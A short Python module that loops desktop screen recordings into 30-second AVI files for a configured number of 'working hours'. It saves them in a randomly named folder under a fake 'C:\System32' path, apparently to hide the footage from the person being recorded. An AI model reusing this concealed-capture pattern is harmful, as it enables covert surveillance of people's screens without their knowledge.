import cv2
import numpy as np
import pyautogui
import time
from PC.conf_record import working_hours

SCREEN_SIZE = (1920, 1080)  # screen size


def cap(sec, nom):
    """
    video capture
    :param sec: capture time for each video
    :param nom: created video number
    """
    start_time = time.time()
    # video creation
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(fr"C:\System32\x73x2jx45\desktop_video_{nom}.avi", fourcc, 20.0, (SCREEN_SIZE))
    print(time.time())
    while True:

        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
        # time limit check
        if start_time + sec < time.time():
            break
    # closing processes
    cv2.destroyAllWindows()
    out.release()


def video_cap(sec=30):
    """
    video creation and processing
    :param sec: capture time for each video
    """

    nom = 1  # video numbering
    start_time = time.time()
    while True:
        # check for amount of video time
        if start_time + working_hours < time.time():
            return
        cap(sec, nom)
        nom += 1

